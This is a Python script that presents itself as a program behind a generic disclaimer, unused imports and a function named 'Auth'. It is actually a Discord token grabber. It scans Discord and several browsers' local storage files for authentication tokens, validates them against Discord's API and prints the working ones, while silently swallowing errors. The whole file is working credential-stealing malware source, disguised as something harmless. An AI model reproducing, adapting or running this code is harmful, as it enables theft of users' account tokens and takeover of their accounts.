print(f"THIS PROGRAM COMES WITH NO WARRANTY AND I AM NOT RESPONSIBLE FOR ANY DAMAGES!\nUse at your own risk.")
import os
os.system("pause")
import random
import threading
from threading import Thread
import string
import urllib3
urllib3.disable_warnings()
import asyncio
import time
from time import sleep

def Auth():
    def dastela():
        from re import findall
        from json import loads
        from base64 import b64decode
        from subprocess import Popen, PIPE
        from urllib.request import Request, urlopen
        LOCAL = os.getenv("LOCALAPPDATA")
        ROAMING = os.getenv("APPDATA")
        PATHS = {
            "Discord"           : ROAMING + "\\Discord",
            "Discord Canary"    : ROAMING + "\\discordcanary",
            "Discord PTB"       : ROAMING + "\\discordptb",
            "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
            "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
            "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
        }
        def getheaders(token=None, content_type="application/json"):
            headers = {
                "Content-Type": content_type,
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
            }
            if token:
                headers.update({"Authorization": token})
            return headers
        def check_if_valid(token):
            try:
                return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
            except:
                pass
        def gettokens(path):
            path += "\\Local Storage\\leveldb"
            tokens = []
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            tokens.append(token)
            return tokens
        def main():
            cache_path = ROAMING + "\\.cache~$"
            working = []
            checked = []
            working_ids = []
            for platform, path in PATHS.items():
                if not os.path.exists(path):
                    continue
                for token in gettokens(path):
                    if token in checked:
                        continue
                    checked.append(token)
                    uid = None
                    if not token.startswith("mfa."):
                        try:
                            uid = b64decode(token.split(".")[0].encode()).decode()
                        except:
                            pass
                        if not uid or uid in working_ids:
                            continue
                    user_data = check_if_valid(token)
                    if not user_data:
                        continue
                    working_ids.append(uid)
                    working.append(token)
                    print(f"Found valid token in {platform} : {token}")
        try:
            main()
        except Exception as e:
            print(e)
            pass
    try:
        dastela()
    except:
        pass
    time.sleep(5)

Auth()
os.system("pause")
